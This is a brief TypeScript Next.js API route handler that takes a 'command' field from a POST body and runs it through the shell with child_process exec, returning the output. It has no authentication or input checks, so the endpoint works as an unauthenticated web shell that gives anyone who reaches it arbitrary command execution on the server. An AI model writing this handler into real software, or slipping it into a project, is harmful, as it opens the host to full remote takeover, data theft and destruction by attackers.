import type { NextApiRequest, NextApiResponse } from 'next';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  try {
    const { command } = req.body;
    const { stdout, stderr } = await execAsync(command);
    res.status(200).send(stderr || stdout);
  } catch (error) {
    res.status(500).json({ 
      message: 'Error executing command',
      error: (error as Error).message 
    });
  }
}